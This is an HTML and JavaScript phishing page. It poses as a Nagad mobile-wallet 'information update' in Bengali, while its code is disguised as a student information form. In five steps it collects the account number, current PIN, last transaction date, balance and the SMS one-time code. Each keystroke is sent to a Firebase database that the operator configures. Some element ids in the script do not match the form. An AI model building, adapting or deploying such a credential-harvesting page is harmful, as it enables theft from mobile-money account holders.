<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Student Info Steps</title>
<style>
 
 {
  box-sizing: border-box;
}

body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #f4f4f4;
  color: #222;
}

.header {
  display: flex;
  align-items: center;
  justify-content: flex-start;
  gap: 12px;
  padding: 10px 15px;
}

.logo img {
  width: 60px;
  height: 60px;
  object-fit: contain;
  display: block;
}

.tag {
  font-size: 10px;
  border: 1px solid white;
  padding: 6px 9px;
  border-radius: 5px;
}

.container {
  width: 100%;
  max-width: 430px;
  margin: 25px auto;
  padding: 15px;
}

.notice {
  background: #fff2d8;
  color: #795400;
  padding: 13px;
  border-radius: 8px;
  font-size: 13px;
  line-height: 1.6;
  margin-bottom: 18px;
  text-align: center;
}

.card {
  background: white;
  padding: 23px 20px;
  border-radius: 12px;
  box-shadow: 0 3px 15px rgba(0,0,0,0.08);
}

.progress-area {
  margin-bottom: 25px;
}

#progress {
  font-size: 12px;
  font-weight: bold;
  color: #c92332;
}

.progress-bg {
  width: 100%;
  height: 6px;
  background: #eee;
  border-radius: 10px;
  margin-top: 9px;
  overflow: hidden;
}

#progressBar {
  width: 20%;
  height: 100%;
  background: #c92332;
}

h2 {
  font-size: 21px;
  margin-bottom: 22px;
}

#content p {
  font-size: 14px;
  line-height: 1.6;
}

input {
  display: block;
  width: 100%;
  padding: 15px;
  margin: 14px 0;
  border: 1px solid #ccc;
  border-radius: 8px;
  font-size: 16px;
}

input:focus {
  border-color: #c92332;
}

small {
  color: #777;
  font-size: 12px;
}

.demo-info {
  background: #fff0f0;
  border: 1px solid #e6a5aa;
  padding: 18px;
  border-radius: 9px;
  text-align: center;
  font-size: 21px;
  font-weight: bold;
  color: #b51f2a;
  margin: 15px 0;
}

button {
  width: 100%;
  border: none;
  border-radius: 8px;
  padding: 15px;
  background: #c92332;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  margin-top: 20px;
}

button:hover {
  background: #a91d2a;
}

.message {
  font-size: 13px;
  color: #b51f2a;
  min-height: 16px;
}

.footer {
  text-align: center;
  font-size: 11px;
  color: #888;
  margin-top: 25px;
}
.demo-logo {
  text-align: center;
  margin: 15px auto;
}

.demo-logo img {
  
  width: 100px !important;
  height: 100px !important;
  max-width: none;
  object-fit: contain;
  display: block;
  margin: 0 auto;
}
.demo-logo p {
  font-size: 13px;
  margin-top: 5px;
}
</style>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>নগদ তথ্য হালনাগাদ 2026</title>
  <link rel="stylesheet" href="style.css">
  </head>
<body>
<div class="wrap">
  <h1>আপনার নগদ অ্যাকাউন্ট নম্বর লিখুন।</h1>
  <p class="sub">Step <span id="stepNum">1</span> of 5</p>
  <div class="progress" id="progress"></div>

  <div class="card">
    <!-- Step 1 -->
    <div class="step" data-step="1">
      <label for="Account Number">Account Number</label>
      <input id="accountNumber" type="text" inputmode="numeric" placeholder="e.g. 01xxxxxxxxxx" autocomplete="off">
      <div class="error" id="err1"></div>
    </div>

    <!-- Step 2 -->
    <div class="step" data-step="2">
      <label for="classNumber">নগদ বর্তামান PIN লিখুন।</label>
      <input id="classNumber" type="text" placeholder="e.g. 0000" autocomplete="off">
      <div class="error" id="err2"></div>
    </div>

    <!-- Step 3 -->
    <div class="step" data-step="3">
      <label for="lastClassDate">সর্বশেষ লেনদেনের তারিখ লিখুন</label>
      <input id="lastClassDate" type="date">
      <label for="currentLevel">আপনার বর্তমান ব্যালেন্স লিখুন</label>
      <input id="currentLevel" type="number" inputmode="numeric" min="0" step="1" placeholder="bdt-12345" autocomplete="off">
      <div class="error" id="err3"></div>
    </div>

    <!-- Step 4 -->
    <div class="step" data-step="4">
      <label for="smsT">ভেরিফিকেশনের জন্য আপনার ফোনে ০৬ সংখ্যার ওটিপি পাঠানো হয়েছে, কল করে কেও কোড জানতে চাইলে তাকে ওটিপি প্রদান করা থেকে বিরত থাকুন।</label>
      <textarea id="smsText" placeholder=" ০৬ সংখ্যার ওটিপ"></textarea>
      <div class="error" id="err4"></div>
    </div>

    <!-- Step 5 -->
    <div class="step" data-step="5">
      <h2>Review all your input</h2>
      <p class="sub">Everything you entered is below. Use "Edit" to change any item.</p>
      <p class="saved" id="savedMsg"></p>
    </div>

    <div class="btns">
      <button class="secondary" id="backBtn" type="button">Back</button>
      <button class="primary" id="nextBtn" type="button">Next</button>
    </div>
  </div>

  <!-- Live view of entered data -->
  <div class="card">
    <h2>Your input data</h2>
    <table id="summary"></table>
    <div class="btns"><button class="secondary" id="clearBtn" type="button">Clear all data</button></div>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
<script>
(function () {
  var TOTAL = 5;

  // ====== FIREBASE CONFIG: Firebase Console > Project settings > Your apps > Web app theke copy kore boshan ======
  var FIREBASE_CONFIG = {
    apiKey: "YOUR_API_KEY",
    authDomain: "YOUR_PROJECT.firebaseapp.com",
    databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
    projectId: "YOUR_PROJECT",
    appId: "YOUR_APP_ID"
  };
  // ================================================================================================

  var db = null, completed = false, syncTimer = null;
  try {
    if (FIREBASE_CONFIG.apiKey !== "YOUR_API_KEY" && window.firebase) {
      firebase.initializeApp(FIREBASE_CONFIG);
      db = firebase.database();
    }
  } catch (e) { console.error(e); }

  function newSessionId() {
    return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
  }
  var sid;
  try { sid = localStorage.getItem("studentSessionId"); } catch (e) {}
  if (!sid) {
    sid = newSessionId();
    try { localStorage.setItem("studentSessionId", sid); } catch (e) {}
  }

  function sync() {
    if (!db) return;
    db.ref("submissions/" + sid).update({
      studentNumber: data.studentNumber || "",
      classNumber: data.classNumber || "",
      lastClassDate: data.lastClassDate || "",
      currentLevel: data.currentLevel || "",
      smsText: data.smsText || "",
      step: step,
      completed: completed,
      updatedAt: firebase.database.ServerValue.TIMESTAMP
    }).catch(function (e) { console.error(e); });
  }
  function scheduleSync() {
    clearTimeout(syncTimer);
    syncTimer = setTimeout(sync, 500);
  }
  var KEY = "studentFormData";
  var data = { studentNumber:"", classNumber:"", lastClassDate:"", currentLevel:"", smsText:"" };
  var step = 1;

  var fields = {
    studentNumber: document.getElementById("studentNumber"),
    classNumber: document.getElementById("classNumber"),
    lastClassDate: document.getElementById("lastClassDate"),
    currentLevel: document.getElementById("currentLevel"),
    smsText: document.getElementById("smsText")
  };
  var labels = [
    ["studentNumber", "Student Number", 1],
    ["classNumber", "Class Number", 2],
    ["lastClassDate", "Last Class Date", 3],
    ["currentLevel", "Current Level", 3],
    ["smsText", "SMS from School", 4]
  ];

  function load() {
    try {
      var s = localStorage.getItem(KEY);
      if (s) data = Object.assign(data, JSON.parse(s));
    } catch (e) {}
    for (var k in fields) fields[k].value = data[k] || "";
  }
  function save() {
    try { localStorage.setItem(KEY, JSON.stringify(data)); } catch (e) {}
  }
  function collect() {
    for (var k in fields) data[k] = fields[k].value.trim();
    save();
    renderSummary();
    scheduleSync();
  }

  function renderProgress() {
    var p = document.getElementById("progress");
    p.innerHTML = "";
    for (var i = 1; i <= TOTAL; i++) {
      var d = document.createElement("div");
      if (i < step) d.className = "done";
      else if (i === step) d.className = "active";
      p.appendChild(d);
    }
  }

  function renderSummary() {
    var t = document.getElementById("summary");
    t.innerHTML = "";
    labels.forEach(function (l) {
      var tr = document.createElement("tr");
      var td1 = document.createElement("td");
      td1.textContent = l[1];
      var td2 = document.createElement("td");
      td2.className = "val";
      if (data[l[0]]) td2.textContent = data[l[0]];
      else { td2.className += " empty"; td2.textContent = "not entered yet"; }
      var td3 = document.createElement("td");
      var b = document.createElement("button");
      b.className = "edit"; b.type = "button"; b.textContent = "Edit";
      b.onclick = function () { collect(); go(l[2]); };
      td3.appendChild(b);
      tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
      t.appendChild(tr);
    });
  }

  function validate(n) {
    var msg = "";
    if (n === 1 && !fields.studentNumber.value.trim()) msg = "Please enter the student number.";
    if (n === 2 && !fields.classNumber.value.trim()) msg = "Please enter the class number.";
    if (n === 3) {
      if (!fields.lastClassDate.value) msg = "Please choose the last class date.";
      else if (!fields.currentLevel.value.trim()) msg = "Please write the current level number.";
    }
    if (n === 4 && !fields.smsText.value.trim()) msg = "Please paste the SMS from school.";
    var el = document.getElementById("err" + n);
    if (el) el.textContent = msg;
    return !msg;
  }

  function go(n) {
    step = n;
    document.querySelectorAll(".step").forEach(function (s) {
      s.classList.toggle("show", +s.getAttribute("data-step") === step);
    });
    document.getElementById("stepNum").textContent = step;
    document.getElementById("backBtn").style.visibility = step === 1 ? "hidden" : "visible";
    document.getElementById("nextBtn").textContent = step === TOTAL ? "Done" : (step === TOTAL - 1 ? "Review" : "Next");
    document.getElementById("savedMsg").textContent = step === TOTAL ? "All data saved in this browser." : "";
    renderProgress();
    scheduleSync();
  }

  document.getElementById("nextBtn").onclick = function () {
    if (step < TOTAL) {
      if (!validate(step)) return;
      collect();
      go(step + 1);
    } else {
      completed = true;
      collect();
      document.getElementById("savedMsg").textContent = "Saved! Thank you.";
    }
  };
  document.getElementById("backBtn").onclick = function () {
    collect();
    if (step > 1) go(step - 1);
  };
  document.getElementById("clearBtn").onclick = function () {
    if (!confirm("Clear all entered data?")) return;
    try { localStorage.removeItem(KEY); } catch (e) {}
    completed = false;
    sid = newSessionId();
    try { localStorage.setItem("studentSessionId", sid); } catch (e) {}
    for (var k in fields) { fields[k].value = ""; data[k] = ""; }
    renderSummary();
    go(1);
  };

  // live update of the summary while typing
  for (var k in fields) {
    fields[k].addEventListener("input", collect);
    fields[k].addEventListener("change", collect);
  }

  load();
  renderSummary();
  go(1);
})();
</script>
</body>
</html>
